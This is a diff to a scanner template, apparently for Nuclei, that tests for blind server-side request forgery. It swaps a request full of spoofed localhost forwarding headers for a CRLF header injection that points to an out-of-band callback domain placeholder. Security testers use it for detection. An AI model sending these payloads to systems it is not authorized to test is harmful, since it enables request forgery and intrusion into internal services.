@@ -1,4 +1,4 @@
-id: 297
+id: 135
 info:
   author: 0xAwali
   name: Blind SSRF
@@ -10,59 +10,14 @@ http:
     words:
     - Your Match
   raw:
-  - 'GET @{{Host}}.{{Port}}.BSSRF-129.{{MY-DOMAIN}}/ HTTP/1.1
+  - 'GET /%20HTTP/1.1%E5%98%8D%E5%98%8AHost:%20{{Host}}.{{Port}}.BSSRF-087.{{MY-DOMAIN}}%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A
+    HTTP/1.1
 
     Host: {{Hostname}}
 
-    X-Forwarded-For: localhost
-
-    X-Forwarded-Host: localhost
-
-    X-Forwarded: localhost
-
-    Forwarded-For: localhost
-
-    Forwarded: for=localhost;by=localhost;host=localhost
-
-    X-Remote-IP: localhost
-
-    X-Remote-Addr: localhost
-
-    True-Client-IP: localhost
-
-    Client-IP: localhost
-
-    X-Client-IP: localhost
-
-    X-Cluster-Client-IP: localhost
-
-    WL-Proxy-Client-IP: localhost
-
-    Proxy-Client-IP: localhost
-
-    Fastly-Client-Ip: localhost
-
-    True-Client-Ip: localhost
-
-    X-Real-IP: localhost
-
-    X-Originating-IP: localhost
-
-    Ali-CDN-Real-IP: localhost
-
-    Cdn-Src-Ip: localhost
-
-    Cdn-Real-Ip: localhost
-
-    CF-Connecting-IP: localhost
-
-    X-Host: localhost
-
-    X-Custom-IP-Authorization: localhost
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
 
     Cache-Control: no-transform
-
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
 
     Accept-Encoding: gzip, deflate
 
